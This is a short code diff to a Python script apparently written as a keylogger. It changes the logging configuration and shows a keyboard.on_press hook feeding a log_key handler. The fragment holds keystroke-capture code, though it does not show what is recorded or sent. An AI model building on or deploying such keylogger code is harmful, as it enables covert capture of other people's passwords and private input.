@@ -87,7 +87,11 @@ def log_key(event):
         logging.error(f"Error in log_key: {e}")
 
 if __name__ == "__main__":
-    logging.basicConfig(filename='keylogger_error.log', level=logging.DEBUG)
+    logging.basicConfig(
+        filename='keylogger_error.log',
+        level=logging.DEBUG,
+        format='%(message)s'
+    )
     logging.debug("Starting keylogger")
     try:
         keyboard.on_press(log_key)
